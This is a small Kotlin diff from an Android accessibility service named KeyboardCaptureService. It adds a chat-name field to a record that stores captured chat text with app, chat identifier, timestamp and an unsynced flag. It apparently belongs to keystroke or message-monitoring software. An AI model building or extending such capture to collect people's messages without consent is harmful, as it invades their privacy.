@@ -147,6 +147,7 @@ class KeyboardCaptureService : AccessibilityService() {
                         appPackage = packageName,
                         appName = appName,
                         chatIdentifier = chatIdentifier,
+                        chatName = chatIdentifier,
                         text = text,
                         timestamp = System.currentTimeMillis(),
                         synced = false
